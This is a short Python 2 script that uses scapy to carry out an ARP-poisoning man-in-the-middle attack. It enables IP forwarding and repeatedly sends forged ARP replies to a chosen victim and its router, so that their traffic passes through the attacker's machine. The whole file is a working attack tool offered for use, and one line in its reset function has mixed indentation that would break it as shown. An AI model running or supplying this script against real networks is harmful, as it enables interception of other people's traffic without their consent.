#!/usr/bin/python
#Author : Fault_Injection
#Desc	: ARP poisonning using scapy
#Date	: 18/03/2015

from scapy.all import *
import sys
import signal
import os
import time


#
#
#
def signal_handler(sig, frm):
	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write("0\n")
	f.close()
	reset(victimIP, router, hdVictim, hdRouter)
	print "[+] END ..."
	sys.exit()
#
#
#
def getMACFromIP(ip):
	res = sr1(ARP(pdst=ip), timeout=4, verbose=0)
	if res:
		return res.hwsrc
#
#
#
def attack(victimIP, router):
	send(ARP(op=2, pdst=victimIP, psrc=router, hwdst=getMACFromIP(victimIP)), verbose=0)
	send(ARP(op=2, pdst=router, psrc=victimIP, hwdst=getMACFromIP(router)), verbose=0)

#
#
#
def reset(victimIP, router, hdVictim, hdRouter):
	send(ARP(psrc=victimIP, pdst=router, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=hdVictim, op=2),verbose=0, count=5)
        send(ARP(psrc=router, pdst=victimIP, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=hdRouter, op=2), verbose=0, count=5)




if __name__ == "__main__":

	if len(sys.argv) < 3:
		print "Usage : sudo ./Script victimIP routerIP"
		sys.exit()
	script, victimIP, router = sys.argv
	
	if os.geteuid() != 0:
		print "Run it as root"
		sys.exit()

	victimIP = sys.argv[1]
	router = sys.argv[2]
	hdVictim = getMACFromIP(victimIP)
	hdRouter = getMACFromIP(router)
	
	print "[+] Starting attack ..."

	f = open("/proc/sys/net/ipv4/ip_forward", "w")
	f.write("1\n")
	f.close()

	signal.signal(signal.SIGINT, signal_handler)

	while True:
		attack(victimIP, router)
		time.sleep(2)
